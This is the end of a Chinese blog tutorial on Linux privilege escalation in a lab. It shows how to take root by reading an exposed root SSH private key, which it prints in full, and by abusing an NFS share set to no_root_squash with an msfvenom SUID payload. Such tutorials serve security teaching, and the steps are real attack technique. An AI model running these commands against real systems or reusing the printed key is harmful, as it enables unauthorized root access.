          <a href="#2-查看root-key文件的内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-查看root-key文件的内容：" class="headerlink" title="2.查看root_key文件的内容："></a>2.查看root_key文件的内容：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /.ssh/root_key</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701181321426.png" alt="image-20210701181321426"></p>

        <h3 id="3-将root-key文件复制到kali并加权以便-SSH-接受它："   >
          <a href="#3-将root-key文件复制到kali并加权以便-SSH-接受它：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-将root-key文件复制到kali并加权以便-SSH-接受它：" class="headerlink" title="3.将root_key文件复制到kali并加权以便 SSH 接受它："></a>3.将root_key文件复制到kali并加权以便 SSH 接受它：</h3>
      <p>注意格式问题</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm</span><br><span class="line">gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl</span><br><span class="line">p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo</span><br><span class="line">OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD</span><br><span class="line">eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET</span><br><span class="line">Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2</span><br><span class="line">NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ</span><br><span class="line">YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+</span><br><span class="line">5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el</span><br><span class="line">WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7</span><br><span class="line">VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7</span><br><span class="line">6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW</span><br><span class="line">1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K</span><br><span class="line">824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6</span><br><span class="line">Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc</span><br><span class="line">U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1</span><br><span class="line">Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi</span><br><span class="line">SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV</span><br><span class="line">d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im</span><br><span class="line">jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa</span><br><span class="line">871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok</span><br><span class="line">X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4</span><br><span class="line">CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN</span><br><span class="line">Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4</span><br><span class="line">LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></div></figure>



<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 root_key</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701181516464.png" alt="image-20210701181516464"></p>

        <h4 id="4-使用密钥进行连接到-SSH-服务器"   >
          <a href="#4-使用密钥进行连接到-SSH-服务器" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-使用密钥进行连接到-SSH-服务器" class="headerlink" title="4.使用密钥进行连接到 SSH 服务器"></a>4.使用密钥进行连接到 SSH 服务器</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i root_key root@192.168.175.228</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701181613497.png" alt="image-20210701181613497"></p>

        <h1 id="0x11-NFS"   >
          <a href="#0x11-NFS" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x11-NFS" class="headerlink" title="0x11 NFS"></a>0x11 NFS</h1>
      
        <h2 id="前言-20"   >
          <a href="#前言-20" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-20" class="headerlink" title="前言"></a>前言</h2>
      <p>NFS（网络文件系统）是一个流行的分布式文件系统。</p>
<p>NFS共享在<code>/etc/exports</code>文件中配置。<br>远程用户可以安装共享、访问、创建、修改文件。<br>默认情况下，创建的文件会继承remote用户的ID 和组ID(分别作为所有者和组)，即使它们不存在 NFS 服务器上。 </p>

        <h2 id="显示-NFS-服务器的导出列表："   >
          <a href="#显示-NFS-服务器的导出列表：" class="heading-link"><i class="fas fa-link"></i></a><a href="#显示-NFS-服务器的导出列表：" class="headerlink" title="显示 NFS 服务器的导出列表："></a>显示 NFS 服务器的导出列表：</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e &lt;target&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="类似的nmap脚本："   >
          <a href="#类似的nmap脚本：" class="heading-link"><i class="fas fa-link"></i></a><a href="#类似的nmap脚本：" class="headerlink" title="类似的nmap脚本："></a>类似的nmap脚本：</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sV –script=nfs-showmount &lt;target&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="安装-NFS-共享："   >
          <a href="#安装-NFS-共享：" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装-NFS-共享：" class="headerlink" title="安装 NFS 共享："></a>安装 NFS 共享：</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="Root-Squashing"   >
          <a href="#Root-Squashing" class="heading-link"><i class="fas fa-link"></i></a><a href="#Root-Squashing" class="headerlink" title="Root Squashing"></a>Root Squashing</h2>
      <p>Root Squashing是 NFS如何防止明显的特权升级。<br>如果远程用户是(或声称是)root(uid=0)，NFS将改为”squash”用户，就好像他们是”nobody”用户一样，在”nogroup”组中。<br>虽然此行为是默认的，但它可以禁用！</p>

        <h2 id="no-root-squash"   >
          <a href="#no-root-squash" class="heading-link"><i class="fas fa-link"></i></a><a href="#no-root-squash" class="headerlink" title="no_root_squash"></a>no_root_squash</h2>
      <p><code>no_root_squash</code>是一个 NFS 配置选项，它关闭root的squash。<br>当包含在可写入的共享配置中时，识别为”root”的远程用户可以作为本地根用户在 NFS 共享上创建文件。</p>

        <h2 id="实操-19"   >
          <a href="#实操-19" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-19" class="headerlink" title="实操"></a>实操</h2>
      
        <h3 id="1-检查-etc-exports-的内容，了解具有no-root-squash选项的配置："   >
          <a href="#1-检查-etc-exports-的内容，了解具有no-root-squash选项的配置：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-检查-etc-exports-的内容，了解具有no-root-squash选项的配置：" class="headerlink" title="1.检查 /etc/exports 的内容，了解具有no_root_squash选项的配置："></a>1.检查 /etc/exports 的内容，了解具有no_root_squash选项的配置：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/exports </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701183617720.png" alt="image-20210701183617720"></p>

        <h3 id="2-确认NFS-共享可用于远程安装："   >
          <a href="#2-确认NFS-共享可用于远程安装：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-确认NFS-共享可用于远程安装：" class="headerlink" title="2.确认NFS 共享可用于远程安装："></a>2.确认NFS 共享可用于远程安装：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.1.25 </span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701183702574.png" alt="image-20210701183702574"></p>

        <h3 id="3-在kali上创建一个文件夹，并安装-tmp-NFS共享："   >
          <a href="#3-在kali上创建一个文件夹，并安装-tmp-NFS共享：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-在kali上创建一个文件夹，并安装-tmp-NFS共享：" class="headerlink" title="3.在kali上创建一个文件夹，并安装/tmp  NFS共享："></a>3.在kali上创建一个文件夹，并安装/tmp  NFS共享：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/nfs </span><br><span class="line"></span><br><span class="line">mount -o rw,vers=2 192.168.175.228:/tmp /tmp/nfs</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701183905563.png" alt="image-20210701183905563"></p>

        <h3 id="4-使用kali上的root用户生成有效载荷并将其保存到安装的共享中："   >
          <a href="#4-使用kali上的root用户生成有效载荷并将其保存到安装的共享中：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-使用kali上的root用户生成有效载荷并将其保存到安装的共享中：" class="headerlink" title="4.使用kali上的root用户生成有效载荷并将其保存到安装的共享中："></a>4.使用kali上的root用户生成有效载荷并将其保存到安装的共享中：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701184010960.png" alt="image-20210701184010960"></p>

        <h3 id="5-确保文件具有-SUID-位集，并且每个用户都可执行："   >
          <a href="#5-确保文件具有-SUID-位集，并且每个用户都可执行：" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-确保文件具有-SUID-位集，并且每个用户都可执行：" class="headerlink" title="5.确保文件具有 SUID 位集，并且每个用户都可执行："></a>5.确保文件具有 SUID 位集，并且每个用户都可执行：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +xs /tmp/nfs/shell.elf</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701184121840.png" alt="image-20210701184121840"></p>

        <h3 id="6-在目标机器上，执行文件以获取root："   >
          <a href="#6-在目标机器上，执行文件以获取root：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-在目标机器上，执行文件以获取root：" class="headerlink" title="6.在目标机器上，执行文件以获取root："></a>6.在目标机器上，执行文件以获取root：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/shell.elf bash-4.1</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701184058216.png" alt="image-20210701184058216"></p>

        <h2 id="权限提升总结"   >
          <a href="#权限提升总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#权限提升总结" class="headerlink" title="权限提升总结"></a>权限提升总结</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.信息收集(id, whoami)</span><br><span class="line">2.运行Linux Smart Enumeration,并增加级别。</span><br><span class="line">3.运行LinEnum和其他脚本</span><br></pre></td></tr></table></div></figure>



<p> 快速查找home中的文件 目录和其他公共位置(例如/var，/backup，/var/logs)</p>
<p>注意：如果用户有一个历史文件，它可能有  重要的信息，比如命令或者 密码 </p>
<p>Sudo，Cron jobs，SUID文件</p>
<p>好好看看root进程，列举它们的版本，检查可以转发到的内部端口</p>
<p>最后考虑内核漏洞，进行提权</p>
<p>希望此文可以帮到大家，加油！！</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://example.com/2021/07/09/Linux%E6%8F%90%E6%9D%83/">http://example.com/2021/07/09/Linux%E6%8F%90%E6%9D%83/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/Linux%E6%8F%90%E6%9D%83/">Linux提权</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/06/22/shiro/"><span class="paginator-prev__text">Shiro总结</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%B8%80%E8%88%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">
          0x01 一般概念</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E3%80%81%E7%BB%84%E3%80%81%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">
          用户、组、文件、目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E8%80%85%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">1.1.1.</span> <span class="toc-text">
          四者之间的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7"><span class="toc-number">1.1.2.</span> <span class="toc-text">
          用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84"><span class="toc-number">1.1.3.</span> <span class="toc-text">
          组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.4.</span> <span class="toc-text">
          文件和目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90"><span class="toc-number">1.2.</span> <span class="toc-text">
          权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">
          文件权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">
          目录权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90"><span class="toc-number">1.2.3.</span> <span class="toc-text">
          特殊权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90"><span class="toc-number">1.2.4.</span> <span class="toc-text">
          查看权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E5%AE%9E%E3%80%81%E6%9C%89%E6%95%88%E5%92%8C%E4%BF%9D%E5%AD%98%E7%9A%84UID-GID"><span class="toc-number">1.3.</span> <span class="toc-text">
          真实、有效和保存的UID&#x2F;GID</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">
          继续深入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">1.3.3.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9C%9F%E5%AE%9E%E6%9C%89%E6%95%88%E7%9A%84%E7%94%A8%E6%88%B7-%E7%BB%84ID%EF%BC%9A"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">
          真实有效的用户&#x2F;组ID：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%EF%BC%88%E5%8D%B3%E6%88%91%E4%BB%AC%E7%9A%84shell%EF%BC%89"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">
          当前进程（即我们的shell）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%94%9F%E6%88%90%E5%A4%96%E5%A3%B3"><span class="toc-number">2.</span> <span class="toc-text">
          0x02 生成外壳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-number">2.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootbash-SUID"><span class="toc-number">2.2.</span> <span class="toc-text">
          rootbash SUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.</span> <span class="toc-text">
          自定义可执行文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom"><span class="toc-number">2.4.</span> <span class="toc-text">
          msfvenom</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8F%8D%E5%90%91%E5%A4%96%E5%A3%B3"><span class="toc-number">2.5.</span> <span class="toc-text">
          本地反向外壳</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">
          0x03 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Smart-Enumeration"><span class="toc-number">3.1.</span> <span class="toc-text">
          Linux Smart Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LinEnum"><span class="toc-number">3.2.</span> <span class="toc-text">
          LinEnum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="toc-number">3.3.</span> <span class="toc-text">
          其他工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">
          0x04 内核漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-2"><span class="toc-number">4.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.</span> <span class="toc-text">
          查找内核漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-1"><span class="toc-number">4.3.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="toc-number">4.3.1.</span> <span class="toc-text">
          查看内核版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AF%BB%E6%89%BE"><span class="toc-number">4.3.2.</span> <span class="toc-text">
          漏洞寻找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E6%BC%8F%E6%B4%9E%E5%BB%BA%E8%AE%AE%E5%99%A8"><span class="toc-number">4.3.3.</span> <span class="toc-text">
          安装漏洞建议器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-5195"><span class="toc-number">4.3.4.</span> <span class="toc-text">
          CVE-2016-5195</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.3.5.</span> <span class="toc-text">
          漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.6.</span> <span class="toc-text">
          通过二进制文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0root%E6%9D%83%E9%99%90"><span class="toc-number">4.3.7.</span> <span class="toc-text">
          成功拿到root权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">
          0x05 服务漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-3"><span class="toc-number">5.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E4%BB%A5root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">5.2.</span> <span class="toc-text">
          查找以root权限运行的服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97%E4%B8%BE%E7%A8%8B%E5%BA%8F%E7%89%88%E6%9C%AC"><span class="toc-number">5.3.</span> <span class="toc-text">
          列举程序版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-2"><span class="toc-number">5.4.</span> <span class="toc-text">
          实操</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BB%A5root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">5.4.1.</span> <span class="toc-text">
          查看以root权限运行的服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BMysqld%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7"><span class="toc-number">5.4.2.</span> <span class="toc-text">
          查看Mysqld的版本号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql-UDF%E6%8F%90%E6%9D%83"><span class="toc-number">5.4.3.</span> <span class="toc-text">
          Mysql-UDF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">5.4.4.</span> <span class="toc-text">
          端口转发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E8%84%86%E5%BC%B1%E7%9A%84%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"><span class="toc-number">6.</span> <span class="toc-text">
          0x06.脆弱的文件权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-4"><span class="toc-number">6.1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">6.2.</span> <span class="toc-text">
          相关的命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-etc-shadow-%E6%96%87%E4%BB%B6"><span class="toc-number">6.3.</span> <span class="toc-text">
          针对&#x2F;etc&#x2F;shadow 文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E4%B8%80%E3%80%81"><span class="toc-number">6.3.1.</span> <span class="toc-text">
          实操一、</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%A3%80%E6%9F%A5%E6%9D%83%E9%99%90-etc-shadow-%E6%96%87%E4%BB%B6"><span class="toc-number">6.3.1.1.</span> <span class="toc-text">
          1.检查权限 &#x2F;etc&#x2F;shadow 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%8F%90%E5%8F%96root%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C"><span class="toc-number">6.3.1.2.</span> <span class="toc-text">
          2.提取root用户的密码哈希</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B0%86%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%E4%BF%9D%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%AD"><span class="toc-number">6.3.1.3.</span> <span class="toc-text">
          3.将密码哈希保存在文件中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8%E5%BC%80%E8%86%9B%E6%89%8B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C"><span class="toc-number">6.3.1.4.</span> <span class="toc-text">
          4.使用开膛手破解密码哈希</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8su-%E5%91%BD%E4%BB%A4%E5%88%87%E6%8D%A2%E5%88%B0root%E7%94%A8%E6%88%B7"><span class="toc-number">6.3.1.5.</span> <span class="toc-text">
          5.使用su 命令切换到root用户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E4%BA%8C%E3%80%81"><span class="toc-number">6.3.2.</span> <span class="toc-text">
          实操二、</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%A3%80%E6%9F%A5%E6%9D%83%E9%99%90-etc-shadow-%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">6.3.2.1.</span> <span class="toc-text">
